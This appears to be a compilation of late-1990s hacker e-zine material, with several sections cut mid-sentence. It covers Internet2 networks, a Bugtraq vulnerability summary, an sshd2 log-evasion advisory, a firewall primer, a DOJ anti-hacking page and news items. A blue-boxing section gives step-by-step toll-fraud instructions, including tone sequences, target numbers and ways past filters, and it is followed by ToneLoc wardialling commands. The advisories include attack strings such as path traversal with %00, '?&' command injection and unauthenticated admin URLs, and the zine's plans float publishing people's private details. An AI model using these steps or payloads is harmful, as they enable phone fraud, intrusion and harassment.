      for the vBNS. I guess the US GOV and academic establishments realized
      that the US wasn't exactly the smartest country on the planet. The
      International peers connect through the STARTAP and connect from there to
      other i2 or NGI peers. STARTAP (Science, Technology, And Research Transit
      Access Point) is the International NAP for most US networks (other than
      the Internet). The STARTAP connects directly to the Ameritech NAP in
      Chicago which connects to the vBNS and many other high speed US networks.
      The STARTAP is funded by the NSF and maintained by the University of
      Illinois at Chicago and a few other Chicago based groups. The STARTAP
      currently supports speeds up to OC-12 and supports DiffServ, RSVP,
      Multicasting and IPv6. For more information on the STARTAP check out:
      www.startap.net
      
      The following are just a few examples of International networks are
      hooking up to i2 or NGI through the STARTAP. 
      
      >> Israel's tap
      The Israeli government has committed $10 million a year for the next four
      years towards advanced network development in Israel. The group in charge
      of all i2 and NGI activities is the IUCC (Israel Inter-University
      Computation Center) whose main members are the eight major universities
      in Israel. This is where it will start, with the Universities, and then
      shortly after it should be open to commercial R&D departments.
      There is one Satellite link at 44mbps from Israel (Tel Aviv University)
      to the STARTAP in Chicago US. Israel bought the entire spectrum on the
      sat so there are plans for upgrading that speed anywhere from 60mbps to
      140mbps, as needed. There is also a fiber optic E3 (34mbps) line from
      Israel (Bar Ilan U. I believe) to the UK where it connects to the QUANTUM
      network in Europe  (http://www.dante.net/quantum).  After that there is
      another fiber optic line going from the connection point in the UK over
      to the US at 10mbps for redundancy.
      
      I've heard rumors of a 2gbps line being setup from the US to Israel but I
      have not been able to confirm this.
      
      Though the i2 website for the IUCC claims full support for QoS, I don't
      believe it. At an i2/NGI conference I went to I asked one of the IUCC
      speakers about this and he gave no real assurances for QoS support, quite
      the opposite.
      
      For more information on the i2 project in Israel go to
      www.internet-2.org.il
      
      >> CA*NET3
      CA*NET3 currently runs at OC-48 (2.5gbps). The Canadian government in
      partner with some High Tech companies funds the project. NAP's to the
      backbone are located all along the southern border of Canada and connects
      to other US networks through the STARTAP. The Canadian Government has
      committed $53 million to the project which will last a year or so (don't
      remember the exacts). The project was initiated in 1998. CA*NET3 uses
      DWDM (Dense Wavelength Division Multiplexing) to get to OC-48. CANARIE
      (Canadian Network for the Advancement of Research, Industry and
      Education) is the group in charge of the project and for more info check
      out their site at: www.canarie.ca or www.canet3.net. The CANARIE
      consortium includes commercial, academic and governmental departments of
      Canada.
      
      IV. Security concerns
      ------------------------------------------------------------------------
      There are a couple of security concerns as I see it. The first is about
      the way most universities and organizations make requests to plug up to
      i2 or NGI. They create a proposal and many will list, in great detail,
      the details of their network. One sad sight I saw was the San Diego
      Supercomputer Center which posted a map of all the IP NetID's for its
      network. Even worse was CANARIE which posted the same thing (the NetID's)
      for the entire CA*NET3 backbone. Now, these are private networks.
      However, all I would need, in theory, is a terminal at a i2 or NGI peer
      to start playing around. It seams even easier when I start to really look
      at their proposals. Most peers make the default path their NGI or i2
      connection when the destination is another i2 or NGI peer, even for
      something as simple as a webpage. So, depending on how it is implemented
      I may be able to just start from a simple Student terminal, as opposed to
      having to hack into the Systems group terminals or servers first.
      The second is concerning DoS attacks. Give me bandwidth and I'm in DoS
      heaven :) On a i2 or NGI peer's network I may have allot of bandwidth at
      my disposal (depending on what type of policy they come under when
      connecting to i2 or NGI backbones). Then, if I find a peer stupid enough
      with a proxy from there to the normal Internet, who knows.
      And I'm only a nominal security buff, I imagine that there are allot more
      concerns that I haven't seen. There is, however, a IETF Security
      Workgroup in place for this exact reason. So, who knows?
      
      
      
      If you have any questions, comments, corrections... 
      e-mail me at: mindmore@mindless.com
      
      I will try to post any technical corrections in the next issue of this
      e-zine.

      -----------------
      Brief Description
      -----------------
      The AXS webserver script by Fluid Dynamics(www.xav.com) allows unauthorized third party
      users to make use of the ax-admin Administration/Configuration module and remotely edit and/or
      delete log files and overwriting files on the system. System resources compromization might also
      be one of the effects of this vulnerability.
      
      
      --------------------
      Vulnerable Platforms
      --------------------
      Any operating system AXS is compatible with.
      
      
      - *NIX Operating Systems (AXS cgi set)
      
      - WindowsNT Operating System (AXS perl set)
      
      I have seen the AXS
      ( cgi set ) operate on Apache 1.2.6/1.3.3, NCSA, Netscape-Commerce.
      ( perl set ) operate on IIS 3.0/4.0, Netscape-Fasttrack.
      
      
      -------------------------
      Vulnerability Description
      -------------------------
      The AXS Script, which is a cgi or perl script that keeps track of the number, the source
      locations, the clientinfo of visitors to your http port(80). It writes this data to an output
      file, named log.txt by default (but it can easily be relocated). This log.txt is normally
      located in the cgi-bin directory of the server, allowing write access to this directory.
      
      The AXS cgi script contains two .cgi appended files; ax.cgi and ax-admin.cgi respectively.
      The ax.cgi file is the one that actually "grabs" the info about the visitors and then writes
      them to log.txt (or wherever you relocated this too). The ax-admin.cgi is the the configuration
      file for the ax.cgi script. The ax-admin.cgi is default passworded by "IronMan" and sometimes
      is even left blank. Due to this weak access security it is very easy to gain "configuration access"
      to the ax.cgi script, allowing you to reconfigure it, delete the log files, change the location of the logs.
      
      The default location for the AXS script is http://www.server.com/cgi-bin/ax.cgi.
      The default location for the AXS Admin script is http://www.server.com/cgi-bin/ax-admin.cgi.
      
      To obtain access to the ax-admin.cgi module by default you get a password screen issued, Ironman
      being the default password. The password is determined by the characters in the $password="*"
      field of the ax-admin.cgi hardcode ("*" being a the default/chosen password or a blank). Most of the
      time I have seen the password field to be left blank or defaulted. If the password is left blank you
      will not be prompted for a login screen, instead it will automatically drop you into the ax-admin
      configuration page. From this point on you can alter files on the server system, possibly resulting
      in Denial-of-Service attacks against the system's resources.
      
      
      
      ---------
      Solutions
      ---------
      The AXS problems relate to a lack of resources that could suffice for secure business applications.
      The AXS script on the other hand has been developed for ease of use, not for trouble of security;
      this is one of the mistakes that Fluid Dynamics has made. The easy way is not to run with none or
      default password on the ax-admin.cgi module. I have informed Fluid Dynamics about the fact that I
      have seen servers where the ax-admin password was the same as the one for a valid shell account on
      that system. Fluid Dynamics has also gone trough no trouble at all to encrypt any of the passwords
      used in the ax-admin verification.

      Part 1. Blue Boxing
      
      Part 2 will be on Beige Boxing and will be in the issue 3 of PURSUiT
      
      Blue boxing is sending noises down a fone line to sieze the trunk and make
      free fone calls (among other things). The trunk is where operators dial from.
      But they don't use the same frequencies as home fones, so we need to get
      the tones from your soundcard to the fone line.
      
      What you will need for this hobby:
      
      1 Computer + Sound card
      1 Tone-generating software (eg. http://x-iz.net/gbh/bluebeep.zip)
      1 Cheap telephone (I use the old 'Viscount' series by BT because I have a
              friend who has loads he doesn't want)
      4 Wires (at least 1 metre each)
      2 2.5mm jack plugs (from your local electrical shop)
      1 Hole-making equipment (hammer+nail)
      1 Soldering iron + solder (optional)
      
      What you must do for this hobby:
      
      Open up the handset so you can see all the insides. There should be a
      speaker and a microphone, each with 2 wires connecting into them.
      Attach (or solder) one of your 4 wires to each of the wires in the handset.
      Now make a hole in the casing for the wires to emerge from.
      Open up the jack plugs and attach the 2 wires from the speaker to the
      connections in one plug and and 2 wires from the mic to the connections
      in the other plug. Use solder if you want. Stick the handset back together.
      
      Disconnect the speakers and microphone from your computer and plug the
      earpiece into the microphone socket and the mouthpiece into the speaker
      socket.
      
      -OR- If you have electrical knowledge, you could make a box that generates
      the tones by its self and doesn't need connection to a soundcard.
      
      
      
      A long time ago, BT had a tone (2280hz) which was used by BT engineers to
      access cirtain funtions within the trunk. Phreakers discovered that this
      could be abused to sieze the trunk and make free calls out of it. But BT
      got wise to the phreakers so now blue boxing is impossible in the UK.
      But BT does have 'country direct' lines which are freefone 0800 numbers to
      overseas. They are mostly in the 0800 890 XXX range along with some other
      useful numbers. These countries' exchanges are not as modern as here and they
      are blue boxable. (NB: not all country direct lines are boxable)
      
      
      Some country direct numbers to countries with CCITT-5 lines:
      South Africa   0800 890 027
      Germany        0800 890 049
      Brazil         0800 890 055
      Chilie         0800 890 056
      Libia          0800 890 059
      Australia      0800 890 061
      Indonesia      0800 890 062
      French         0800 890 133
      Bahamas        0800 890 135
      Gabon          0800 890 241
      etc etc etc
      
      You can then make an international call out of that country
      to the UK (or any other country) and make a free call.
      
      
      
      Using Bluebeep by Onkel Dittmeyer:
      
      The 'action mode' sucks so you should program a script to play the
      tones. A sample (and very good) script that I made is included in
      the zip file (http://x-iz.net/gbh/bluebeep.zip)
      To make your own script to your own needs, read 'Script Language'
      from the Info|Documentation menu.
      To run a script, type BLUEBEEP /EXEC FILENAME.EXT from the prompt.
      For a list of all the command-line switches, type BLUEBEEP /?

      Be aware that duration times may differ slightly with the exchange.
      
      To sieze the trunk of a CCITT-5 line:
      
      1. You will hear a bleep after you dial the country direct number
      2. Send the clear ahead tone after that bleep (makes it think you've hung up)
      3. Then Send the sieze tone (so it thinks it's talking to the telco equipment)
      4. You will hear a bleep and a chunk
      5. Dial the number as shown:
          KP2+Zero+CountryCode+AreaCode+Number+ST
        eg. KP2,0441818118181,ST
      
      But BT often put filters on the country direct lines to filter out
      these tones. Here are some tricks to get past a lot of filters:
      
      The average tone of a conversation is around 3000 Hz. This is called
      'pink noise'. Bluebeep allows 3 simultaneous tones, so add 3000 Hz
      to the last frequency of each tone in the dial set list.
      
      Some filters raise or lower the pitch of the sound slightly.
      Try tones just above or just below the given frequencies.
      (eg. 2395 or 2405 instead of 2400)
      You may have to do some freqency analysis on the echo you get from the system.
      A good tool for this is Wintone (30-day trial version at www.steaksandwich.com,
      registration $20 (13), or you could read my article on cracking software,
      which will be coming soon in PURSUiT)
      
      
      That's it guys. Any information you may have on UK boxing can be sent to
      ms@punkass.com for a great big essay i have planned for the mag next year
      on UK boxing. Remember part 2 of this article (beige boxing) is in issue 2.
      
      
      Wardialling & Scanning
      
      If a country direct number is abused too much then BT is forced to
      shut it down :(
      So every so often the one you use will go away and you'll have to
      use another. Well, the list above is by no means complete. And there
      are other very useful numbers in the 0800 890 XXX range, so...
      
      Why not find out what they all are?
      "What, scan 1000 numbers???"
      No... you get a wardialler to do that for you. It dials them all up
      (don't do this all at once, BT'll notice) and when you come back
      it'll tell you which ones picked up and which ones didn't exist.
      (it might also tell you if it was a data or voice line)
      Then you can dial the ones that look interesting.
      You just tell it what range to scan and leave it for a while.
      You could also be at your deak while the dialler is running so you
      can listen to them and take note of what the voice ones are, like
      "voice: "Mark at reception how may I help you?"
      A good wardialler is ToneLoc at http://x-iz.net/gbh/toneloc.zip
      
      
      Example ToneLoc Syntax:
      
      C:\> TONELOC OUTPUT.TXT /M:0800890XXX /R:000-999 /S:3:00a /E:4:00a
      will dial 0800890000, 0800890001, 0800890002... 0800890999
      starting at 3 am and ending at 4 am (regardless of how far thru the
      scan it has got)
      C:\> TONELOC OUTPUT.TXT /M:0800890XXX /R:000-999 /H:1:00
      will scan the range starting NOW and ending in one hour
      
      Toneloc also has some cool options like Black Book; A txt file of
      numbers to NEVER dial (eg. 999) during a scan and loads of other cool stuff.
      To setup options like that and config stuff like modem strings, run
      TLCFG.EXE
      
      A really neat trick is the Scan Map. I can't explain it, it is just
      so great. Run TONEMAP SAMPLE.DAT to see what I mean.

      What is a firewall?
      ---------------------
      A firewall is a system or group of systems that enforces an access control
      policy between two networks. The actual means by which this happens
      varies widely, but in principle, the firewall can be thought
      of as a pair of mechanisms, one that is there to block traffic, and the
      other which permits traffic. Some firewalls place a greater
      emphasis on only blocking traffic, while others are strictly for permitting traffic.
      
      Diagram:
      
      O = Outside Host        1: packets to the firewall
      F = Firewall/Router     2: firewall accepts or denys
      I = Internal Network    3: packets go to host

      Protection
      --------------
      Firewalls offer protection against many kinds of things. They offer
      protection from malicious packets, e-mail spam/bombs, and also, intruders
      to your system. But their is also attacks Firewalls CANNOT protect u
      against (attacks that dont go threw the firewall) like people from inside
      the network, and from there, that user can give access to outside
      networks, which can be potentionally dangerous to your network. And
      lastly, Firewalls cant protect against tunneling over application
      protocols to trojaned or poorly written clients. 
      
      Types of Firewalls
      --------------------
      
      1: Network Layer
      ------------------
      Network firewalls usually make there desicions based on address (source)
      and the ports of a packet. Routers are probably the most known network
      level firewall, because its not able to make a great decision about where
      the packet is actually going or where it came from. Newer network firewalls
      have increased greatly in maintaining information about the packets that
      pass threw them, contents of data streams, and other sources of information.
      A imporant thing to remember is that network firewalls route traffic directly
      threw them, so to use one you usually need to have a validly assigned IP address
      block. Network firewalls usually are fast and transparent to users.
      
      
      2: Application Layer
      ----------------------
      Application level firewalls are usually a host running proxy servers.
      The proxy server usually permit no traffic directly between networks
      and give a more detailed log of traffic then the Network level firewalls.
      These firewalls can be used as network address translators, since packets
      go "in one side and out the other", after passing threw a application
      that effectivly masks the origin of the initiating connection.
      
      
      Proxy Servers
      ---------------
      A proxy server is a application that mediates traffic between a protected
      network and the Internet, meaning it only allows specific connections to
      connect to the host, and allows only connections out of the host threw specified
      ports. Proxys are usually used instead of router based traffic controls, because they
      prevent traffic from passing directly between two network. Alot of proxys
      have more logging and support for the user authentication. Because proxys must
      understand the application protocol being used, they can also implement protocol
      specific security, where as only certin prototcols are allowed to be incoming
      and outgoing from a host.
      
      
      Firewall Downsides
      --------------------
      Firewalls while restricting access from outside attacks. Also restricts
      users inside the network to connect to some/maybe even all networks
      outside the current one. This means, a user in the secure network, may not
      be able to connect to lets say www.linux.org unless he has the permissions
      to. This also is the same for ftp, telnet, and other various network
      utilities.

      Well after all, that's the first issue of PURSUiT, so we have 
      no news to talk about, so we will use this space for ideas, 
      future features and other things.
      
      Stuff we had on mind:
      ---------------------
      
      1. Lamer list
         This was the idea of one of us, just to take out rage on people
         that keep on bugging us, or just for the fun of it. If we will
         include it in the future, I belive it won't be serious, just to
         have some laughs the night after it on IRC ;)
      
      2. Shouts
         It's my idea mostly, though I think it won't be included. If it 
         will, we will probably use it to thank people who helped putting
         out the zine, reviewed it, made some corrections etc.
      
      3. Docs exposing
         Now this idea came through an anonymous source, which suggested
         that PURSUiT could drop docs of a few people here and then. The 
         people we had on mind are mostly the ones that everyone hates,
         (I won't declare them here :) but we first need to get the docs,
         so it might not go.
      
      4. Questions\Answers section
         This is mostly self explained, a section or column, where people
         will be able to email us and we will answer the question over
         the zine, so that other people could know the answer too. If we 
         will get enough response for that, we might do it.
      
      
      That's it for now, if you have other suggestions, ideas, or features
      you belive we should include just email us to:

      II.  BUGTRAQ SUMMARY 2000-03-13 to 2000-03-20
      ---------------------------------------------
      
      
      1. Linux atsar Input Validation Vulnerability
      BugTraq ID: 1048
      Remote: No
      Date Published: 2000-03-11
      Relevant URL:
      http://www.securityfocus.com/bid/1048
      Summary:
      
      atsar is a linux load monitoring software package released under the GPL
      by AT Computing. atsadc is a setuid root binary that is included in the
      atsar package. atsadc will accept as an argument an output file, which it
      will open -- without checking to make sure the user executing atsadc has
      the priviliges to do so. After it has opened and created (or overwritten)
      the target file as root, the permissions set on the file will allow the
      attacker to write to it. Since this file is arbitrary, it is possible to
      gain root locally in any number of ways through creating malicious system
      files. In Teso's proof of concept exploit, root priviliges are gained by
      creating a malicious shared library to be preloaded and
      creating/specifying that library in /etc/ld.so.preload (and then executing
      a setuid binary..).
      
      2. RealServer Internal IP Address Disclosure Vulnerability
      BugTraq ID: 1049
      Remote: Yes
      Date Published: 2000-03-08
      Relevant URL:
      http://www.securityfocus.com/bid/1049
      Summary:
      
      By default, Real Server includes the IP address of the server in data sent
      to the client. If the Real Server is installed on a machine in a NAT
      environment, (where requests from the outside network are handled by
      reverse proxy), this will reveal what are supposed to be private, hidden
      IP addresses.
      
      3. NT Automated Tasks / Drive Mappings Vulnerability
      BugTraq ID: 1050
      Remote: No
      Date Published: 2000-03-14
      Relevant URL:
      http://www.securityfocus.com/bid/1050
      Summary:
      
      Any automated task that relies on mapped drives and runs at a higher
      privelege level than the logged-on user can be exploited by changing the
      drive mapping. By replicating the directory structure of the intended
      drive, and replacing the contents of the scheduled executables or
      configuration files with other data, it is possible for a local attacker
      to cause arbitrary code to be executed at an elevated privelege level.
      
      
      For example:
      \\Workstation has the following drive mapping:
      S: \\Server\Scripts
      and there is an AT job that runs S:\Daily.bat every day as the Local Administrator.
      
      Now all the attacker has to do is replace the S: mapping with one that
      specifies a target where the attacker has write privileges
      (\\Workstation\C$ for example). Then if the batch file C:\Daily.bat is
      created, it will be run as Local Administrator.
      
      
      4. Atrium Software Mercur Mail Server 3.2 Buffer Overflow Vulnerability
      BugTraq ID: 1051
      Remote: Yes
      Date Published: 2000-03-14
      Relevant URL:
      http://www.securityfocus.com/bid/1051
      Summary:
      
      Atrium Software Mercur is a SMTP, POP3, and IMAP mail server.
      Insufficient boundary checking exists within the login command, causing
      the application to crash if a string consisting of over 3000 characters is
      used as a username.  This affects both the POP3 and IMAP server in the
      Mercur mail server suite.
      
      5. Sojourn File Access Vulnerability
      BugTraq ID: 1052
      Remote: Yes
      Date Published: 2000-03-14
      Relevant URL:
      http://www.securityfocus.com/bid/1052
      Summary:
      
      Any file that the webserver has read access to can be read on a server
      running the Sojourn search engine.
      
      The Sojourn software includes the ability to organize a website into
      categories. These categories can then be accessed via the sojourn.cgi Perl
      script. This is done by making a request for a URL like:
      
      http ://target/cgi-bin/sojourn.cgi?cat=categoryname
      
      Each category has an associated .txt file based on the category name. The
      program appends the .txt extension onto the contents of the 'cat'
      variable. However, the program will accept and follow the '../' string in
      the variable contents, allowing read access to any .txt file the webserver
      can read.
      
      This restriction can be bypassed by appending %00 to the end of the
      requested file, which will prevent the .txt extension from being used in
      the filename.
      
      6. Oracle Web Listener Batch File Vulnerability BugTraq ID: 1053 Remote:
      Yes Date Published: 2000-03-15 Relevant URL:
      http://www.securityfocus.com/bid/1053 Summary:
      
      Oracle Web Listener for NT makes use of various batch files as cgi
      scripts, which are stored in the /ows-bin/ directory by default.
      
      Any of these batch files can be used to run arbitrary commands on the
      server, simply by appending '?&' and a command to the filename. The
      command will be run at the SYSTEM level. The name of a batch file is not
      even neccessary, as it will translate the '*' character and apply the
      appended string to every batch file in the directory. Moreover, UNC paths
      can be used to cause the server to download and execute remote code.
      
      
      7. Checkpoint Firewall-1 Internal Address Leakage Vulnerability
      BugTraq ID: 1054
      Remote: Yes
      Date Published: 2000-03-11
      Relevant URL:
      http://www.securityfocus.com/bid/1054
      Summary:
      
      A vulnerability exists in which Checkpoint Firewall-1 will expose internal
      addresses to machines outside the network. Under seemingly normal load
      conditions, according to the poster of this vulnerability, 40% CPU
      utilization with 200+ active connections, Firewall-1 will attempt to
      establish connections utilizing the internal address. As this address is
      either non-routable, or internal, a retransmission will occur; this packet
      will have the correct address rewritten, but will use the same source
      port. Using this information makes it easy to determine the firewall
      behind which this address resides, as well as the internal address of the
      machine being utilized to establish the connection being seen. This may be
      particularly useful to attackers conducting client side attacks.
      
      These problems have been seen on both NT and Solaris versions of FW-1,
      although the poster indicated that not enough data was available to
      directly state the Solaris version was vulnerable in the same ways, or to
      the same degrees.
      
      8. Microsoft SQL Weak Password Encryption Vulnerability
      BugTraq ID: 1055
      Remote: No
      Date Published: 2000-03-14
      Relevant URL:
      http://www.securityfocus.com/bid/1055
      Summary:
      
      If 'Always prompt for login name and password' is not set, and Windows
      Integrated Security is not being used, Enterprise Manager for SQL Server 7
      will save the login ID and password in the registry key
      HKCU\SOFTWARE\Microsoft\MSSQLServer\SQLEW\Registered Server X. The
      algorithm used to encrypt the password consists of XORing each character
      with a two byte value dependant on the character's position in the string.
      
      If 'Always prompt for login name and password' is set, or Windows
      Integrated Security is used, the ID and password are not saved at all.
      
      
      9. Atrium Software Mercur WebView WebMail-Client Buffer Overflow Vulnerability
      BugTraq ID: 1056
      Remote: Yes
      Date Published: 2000-03-16
      Relevant URL:
      http://www.securityfocus.com/bid/1056
      Summary:
      
      WebView WebMail-Client is an add-on for the Mercur SMTP/POP3/IMAP4 Mail
      Server which allows a user to access email through a web browser.
      
      Insufficient boundary checking exists in the code which handles GET
      requests, specifically on port 1080.  Issuing a GET request containing a
      string of over 1000 characters on port 1080 will cause the WebView
      WebMail-Client application to crash.
      
      eg.
      http: file://target/&mail_user=<string containing over 1000 characters>
      
      10. Trend Micro OfficeScan Unauthenticated CGI Usage Vulnerability
      BugTraq ID: 1057
      Remote: Yes
      Date Published: 2000-03-16
      Relevant URL:
      http://www.securityfocus.com/bid/1057
      Summary:
      
      Trend Micro OfficeScan is an antivirus software program which is
      deployable across an entire network. During the installation of the
      management software, the administrator is asked to choose between managing
      from a webserver or from a fileserver. If the webserver option is chosen,
      the administrator is given the capability to manage the OfficeScan network
      through an HTML interface.  This can be accessed by requesting the
      authentication form which is located at http: file://target/officescan/.  It
      prompts the user for the admin password, however it is transmitted in
      plaintext which can be intercepted by any user on the network running a
      packet sniffer specifically searching for the string "TMLogon=<password>".
      
      A larger problem exists in that any user with access to the web server is
      able to perform administrative functions without any sort of authorization
      simply by requesting specific URLs.  This is accomplished by requesting
      certain CGI files such as jdkRqNotify.exe.  A request for jdkRqNotify.exe
      in conjunction with a domain name on the network and an administrative
      event code number would allow any user on the network to perform certain
      administrative duties.
      
      eg.
      http://target/officescan/cgi/jdkRqNotify.exe?domain=<domain name>&event=<event code number>
      
      Examples of event code numbers are:
      11: Scan now
      12: Uninstall
      14: Roll back
      15: New alert message
      16: New intranet proxy
      17: New privilege
      18: New protocol
      19: New password
      20: New client

116.0 You can get into trouble for hacking!
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      This piece comes from the Dept of Justice website, quite amusing actually..

      Submitted by Sugarking

      http://www.usdoj.gov/kidspage/do-dont/reckless.htm
      
      YOU CAN GET IN REAL TROUBLE FOR HACKING!


      Some kids think they can't get into trouble for hacking computer 
      systems and that hacking big networks like the phone company, the 
      military, or NASA is harmless fun. But that's not true, as one teenager 
      in Boston found out recently.



      The hacker and some of his friends found a way to hack into a computer 
      that belongs to the phone company and that directs telephone traffic in 
      the Boston area. After he got into the system, the hacker decided to 
      reboot the computer, which basically made it crash. The first time he 
      did this, the hacker completely shut off phone service for six hours to 
      a regional airport so that the air traffic control tower had an 
      extrememly hard time communicating. The second time he crashed the 
      computer, he cut off phone service to about 600 homes.



      The phone company reported this to the United States Secret Service, 
      which investigated the case and indentified all the kids involved. 
      Although the Justice Department does not prosecute juveniles very 
      often, the United States Attorney's Office in Boston charged the 
      ringleader of the group with several serious crimes. 



      Even though the student won't go to jail, he did receive very serious 
      punishment: he lost his computer, must pay $5000 to the telephone 
      company, and must work in the community for free for 250 hours. He will 
      also be on probation for the next two years, and during that time he is 
      not allowed to use any computer with a modem. That means, of course, 
      that he is off the Internet and all other networks. 



      DON'T LET THIS HAPPEN TO YOU! If you think about it, it's pretty easy 
      to see why this student got into so much trouble. How would you feel if 
      you were one of the 600 houses that lost phone service? What if you 
      needed to call 911? How would you feel if you had been flying into the 
      airport that lost telephone service?



      The best way to stay out of trouble with computers is to imagine before 
      you do something how you'd feel if someone did it to you. You wouldn't 
      like it if someone opened your mail or looked into your bedroom 
      windows, and if you wouldn't do this either, don't hack into computers. 



      Lots of kids know enough about computers to hack into big networks, but 
      so what? It doesn't mean you're smart, it just means you don't mind 
      hurting other people--because it does hurt them. People are not going 
      to want to hire you to protect computers if you've been a hacker. It's 
      a question of trust, not skill.



      If you like computers, don't use your brains to hack systems, invade 
      other people's privacy, and take away their networks. Hacking can get 
      you in a whole lot more trouble than you think and is a completely 
      creepy thing to do. If you're so smart, use that computer to do great 
      things!

        Application: sshd2 up to 2.0.11
        OS: Unix
        Risk: Risky :), long term could gain system access.
     
        -=-=-=-=-=-=-=-=
         Introduction
        -=-=-=-=-=-=-=-=
     
       In the default instalation of sshd2 (up to 2.0.11) there is an
        open way to bruteforce a login/password, without any kind of ip
      logging
        by the sshd. Version 2.0.12 and newers seems to be not vulnerable to
        this attack, because it logs the ip at connection time.
     
        -=-=-=-=-=-=-=-=
         Details
        -=-=-=-=-=-=-=-=
     
       When a ssh client connects to the daemon, it has a number
        (default is three) of attempts to guess the correct password before
        disconnecting. If we shutdown the connection before using up the
      number
        of attempts, the daemon will not log neither the connection, the
        password guesses nor the ip of the client.
     
       One cristal clear example:
     
        [zhodiac@piscis zhodiac]$ ssh -l zhodiac piscis
        zhodiac's password:
        zhodiac's password:
        zhodiac's password:
     
        Disconnected; authentication error.
        [zhodiac@piscis zhodiac]$
     
        In /var/log/messages:
     
           May  9 12:42:53 piscis sshd2[1391]: User authentication failed:
           'Authentication method disabled. (user 'zhodiac', client address
           '192.168.1.1:1344', requested service 'ssh-connection')'
       
       Now we try the bug:
     
        [zhodiac@piscis zhodiac]$ ssh -l zhodiac piscis
        zhodiac's password:
        zhodiac's password:
        zhodiac's password: FATAL: Received signal 2.
        [zhodiac@piscis zhodiac]$ ssh -l zhodiac piscis
        zhodiac's password:
        zhodiac's password:
        zhodiac's password: FATAL: Received signal 2.
        [zhodiac@piscis zhodiac]$ ssh -l zhodiac piscis
        zhodiac's password:
        zhodiac's password:
        zhodiac's password: FATAL: Received signal 2.
        [zhodiac@piscis zhodiac]$
     
       Those  "FATAL: Received signal2." are the response of
        interrupting the program with a ^C.
     
       Lets see what syslog did:
     
        May  9 12:44:41 piscis sshd2[1403]: Remote host disconnected:
      Connection
        closed.
        May  9 12:44:44 piscis sshd2[1405]: Remote host disconnected:
      Connection
        closed.
        May  9 12:44:47 piscis sshd2[1407]: Remote host disconnected:
      Connection
        closed.
     
       No ip, no password guesses attempts on the logs!
        So a bruteforce can be done without any kind of logging... Sorry
        script-kiddies, no program available!
     
        -=-=-=-=-=-=-=-=
         Quick Fix
        -=-=-=-=-=-=-=-=
     
       Edit the file sshd2_config (usually at /etc/ssh2), set the value
        of "PasswordGuesses" to 1. With this each time a password is tried it
        will log it in the following way:
     
        May  9 12:46:07 piscis sshd[1308]: User authentication failed:
        'Authentication method disabled. (user 'zhodiac', client address
        '192.168.1.1:1527', requested service 'ssh-connection')'
     
        It is also recommended to set the value of "ListenAddress" so we
        will have more control of which ips can use our ssh service.
     
       A better solution is to upgrade to 2.0.12 version or newer , with
        them at connection it will log via syslog in the following way:
     
           May  9 15:23:33 piscis sshd2[7184]: connection from "192.168.1.1"

      Outdoing the hackers

      By BBC News Online's Iain Rodger 

      Imagine a team of people spending all their time thinking up ways of 
      hacking into corporate computer networks. 

      Now imagine them, Mission Impossible-style, breaking into the inner 
      sanctum itself - the main computer room. 

      These teams actually exist and, more remarkably, they work largely from 
      within the big firms of accountants. 

      Known as "tiger teams", their brief is to find the holes in the security 
      of their corporate clients before criminal hackers do. 

      Brick trick 

      Jan Babiak is head of Ernst & Young's IT security practice. She told me 
      how one of her firm's tiger teams broke into the computer room of a major 
      North American client, deposited a brick marked "Ernst & Young was here" 
      and left again undetected. 

      They then contacted the firm's bosses and said: "Come and see what we've 
      done." 

      What a great job, don't you think? Kind of James Bond without the 
      disincentive of being shot at. But, of course, it's not quite as simple as 
      that. 

      Most of the time, the teams are methodically trying to crack passwords to 
      find a chink in the armour of supposedly secure sites. 

      Chris Potter, partner in charge of similar operations at Pricewaterhouse 
      Coopers, said his 50-strong UK team mainly tries to replicate the 
      techniques of illegal hackers to probe here and there until weaknesses are 
      identified. 

      Physical break-ins would be rare, he said, and used only when the client 
      had agreed it was appropriate. 

      Jan Babiak also stressed the importance of not being alarmist: "The 
      smartest thing to do is to understand your risks." 

      Then, she said, you can develop cost-effective responses that deal with 
      the risk in a way that "delivers good value to shareholders". Now there's 
      the accountant speaking. 

      How it's done 

      Often using people with backgrounds in military espionage, tiger teams 
      (the name is derived from the American armed forces) use all kinds of 
      tricks to ply their trade. 

      For example, they might mount an attempt to hack into a company round the 
      corner via servers dotted all over the world, making it virtually 
      impossible to detect where the attack is coming from. 

      As the idea is to find the weaknesses in even the most sophisticated 
      security, a wide range of techniques might be used, from wire-tapping to 
      cracking passwords. 

      A small programme might be secreted on the target system which records and 
      transmits keystrokes from given terminals. On the basis that the password 
      is typed within the first 40 keystrokes, it is then relatively easy to 
      find. 

      But, as Chris Potter says, the biggest weaknesses are usually not in the 
      technology but in the "human element", and this is where the other side, 
      known as "social engineering" comes in. 

      In one case, a female member of a tiger team used the age-old weapon of 
      tears to persuade an employee of a target client to give her password 
      details. 

      In another, a visit to an office masquerading as a cleaner was used to 
      obtain information about personal belongings placed around work terminals. 
      Some Arsenal football club pictures were enough of a clue to make cracking 
      the employee's password easy work. 

      Making robust systems 

      Having identified the weaknesses, the team then gives advice on how to 
      change the security system to make it more effective, or even design a 
      system specifically for the client. 

      Ken Cukier, international editor with technology magazine Red Herring, 
      says the tiger teams provide an essential service in developing robust IT 
      infrastructures. 

      The business is certainly growing fast - Ernst & Young's team has 
      quadrupled in size in two years. 

      But Mr Cukier says the talents needed to design a secure system and break 
      that security are not the same, so there needs to be a three-pronged 
      approach to get the best results. 

      He says the tiger teams are great for checking that a system works, but 
      that they tend to rely on long experience of established technques. 

      Bright young things 

      This can miss out the new ways of hacking being thought up by bright young 
      things messing about with cutting-edge technology on the fringes of 
      Silicon Valley. 

      Many of them do not want to work for multinational firms and have been 
      founding their own internet start-ups, realising that they have highly 
      marketable skills. 

      Mr Cukier says combining the tiger teams with the bright young things, 
      along with awareness of the need for constant monitoring of how hacking 
      techniques are changing, produces the best results. 

      He says: "The best you can ever hope for is to be one step ahead of the 
      hackers."

119.0 HNN:Mar 27th:Curador Busted In Wales (See section 110.0 for more)
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
      From HNN http://www.hackernews.com/ 
      
      
      contributed by Brian
      Curador (Raphael Gray), suspected of stealing thousands of credit
      cards from at least nine e-commerce sites and posting them to the
      Internet , was arrested in Wales last week. Some of Curador's victims
      included Promobility, a wireless phone merchant in Ontario;
      SalesGate.com in Buffalo, New York; LTA Media LLC in Knoxville,
      Tennessee; and Feelgoodfalls.com in Denver. Curador and his accomplice
      are expected to be charged under Britain's Computer Misuse Act of 1990
      for the theft and fraudulent use of more than 26,000 credit card
